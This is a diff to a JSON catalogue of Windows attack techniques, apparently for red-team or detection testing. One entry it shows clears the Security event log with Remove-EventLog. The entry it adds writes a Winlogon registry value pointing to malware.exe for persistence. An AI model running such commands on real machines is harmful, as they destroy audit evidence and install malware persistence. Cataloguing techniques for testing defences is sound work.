@@ -268,5 +268,15 @@
       "Attack":"Remove-EventLog -LogName Security",
       "Affect":"",
       "Comment":"Completely unavailable after reboot. Between command launched and the reboot, EventLog are still logged and can be accessed from evtx file. Security EventLog 1102 is generated (log deletion). This command also disables Security EventLog (REP-25-G)"
+   },
+   {
+      "Attack-ID":"0",
+      "Sub-Attack-ID":"001",
+      "Type-Attack":"A <b>(Add Registry Key)</b>",
+      "Privilege":"",
+      "Need Reboot":"",
+      "Attack":"reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v IconServiceLib /t REG_SZ /d malware.exe /f",
+      "Affect":"",
+      "Comment":"Persistence didn't work with .exe or .ps1"
    }
 ]
